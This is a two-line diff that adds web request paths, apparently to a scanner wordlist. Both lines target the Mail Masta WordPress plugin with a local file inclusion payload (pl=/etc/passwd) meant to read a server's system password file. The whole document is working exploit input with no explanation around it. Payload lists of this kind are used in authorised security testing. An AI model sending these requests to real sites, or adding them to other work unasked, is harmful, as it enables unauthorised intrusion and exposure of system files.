@@ -1,0 +1,2 @@
+/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
